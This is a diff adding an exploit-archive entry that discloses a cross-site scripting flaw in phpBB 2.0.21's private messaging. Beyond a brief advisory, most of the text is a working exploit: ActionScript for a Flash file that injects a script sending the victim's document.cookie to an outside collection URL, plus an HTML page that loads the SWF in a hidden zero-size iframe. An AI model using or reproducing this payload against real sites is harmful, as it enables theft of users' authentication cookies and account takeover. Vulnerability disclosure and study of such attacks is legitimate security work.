@@ -1,0 +1,29 @@
+source: http://www.securityfocus.com/bid/22001/info
+
+phpBB is prone to an HTML-injection vulnerability because the application fails to properly sanitize user-supplied input before using it in dynamically generated content. 
+
+Attacker-supplied HTML and script code would execute in the context of the affected website, potentially allowing an attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user; other attacks are also possible. 
+
+Version 2.0.21 is vulnerable; other versions may also be affected.
+
+Create a Shockwave Flash file with this code:
+
+var username:String = "user_that_doesnt_exist";
+var subject:String = "Xss Exploitation";
+var message:String = "&lt;/textarea&gt;<script>document.location= 'http://site.com/cookie.php?c=' + document.cookie </script>";
+var folder:String = "inbox";
+var mode:String = "post";
+var post:String = "Submit";
+getURL("http://www.example.com/phpBB2/privmsg.php", "_self", "POST");
+
+Put it into a web page:
+
+<html>
+<head>
+<title>Put a title here</title>
+</head>
+<body>
+<p>Put some text here<p>
+<iframe src="http://www.example.com/exploit.swf" frameborder="0" height="0" width="0"></iframe>
+</body>
+</html>
